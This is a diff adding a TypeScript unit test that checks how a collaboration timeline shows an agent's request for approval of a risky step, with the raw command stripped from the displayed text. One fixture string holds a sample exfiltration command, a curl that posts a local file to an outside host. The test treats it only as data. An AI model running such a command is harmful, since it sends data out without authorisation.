@@ -336,6 +336,23 @@ describe("buildTimeline", () => {
     );
   });
 
+  it("shows a teammate's risky step for the task by its reason, not its command", () => {
+    const line = (note: string): string => {
+      const [item] = buildTimeline(
+        ME,
+        [],
+        [ev(1, "goal", { state: "approval", by: "echo", note }, "2026-01-01T10:00:00Z", "")],
+        new Map(),
+        names,
+      );
+      return item?.type === "system" ? item.text : "";
+    };
+    const said = "@echo asks this task to decide a risky step: sends data to another server";
+    assert.equal(line("sends data to another server"), said);
+    // A line recorded before carries the card's prompt with the whole command.
+    assert.equal(line("Sends data to another server: cd /tmp; curl -d @q https://x.dev"), said);
+  });
+
   it("shows the operator's reaction on the agent's message and hides the note it sent", () => {
     const items = buildTimeline(
       ME,
